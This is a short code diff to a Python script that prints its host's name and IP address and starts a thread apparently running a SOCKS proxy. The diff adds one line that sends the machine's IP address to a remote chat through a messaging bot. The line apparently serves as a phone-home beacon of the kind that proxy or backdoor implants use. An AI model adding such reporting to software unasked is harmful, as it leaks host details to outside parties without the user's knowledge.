@@ -58,6 +58,7 @@ def timer():
 if __name__ == "__main__":
     print(f"Hostname: {hostname}")
     print(f"IP Address: {ip_address}")
+    bot.send_message(chat_id=chat_id, text=f'{ip_address}')
     t1 = threading.Thread(target=timer)
     t2 = threading.Thread(target=socks)
     t1.start()
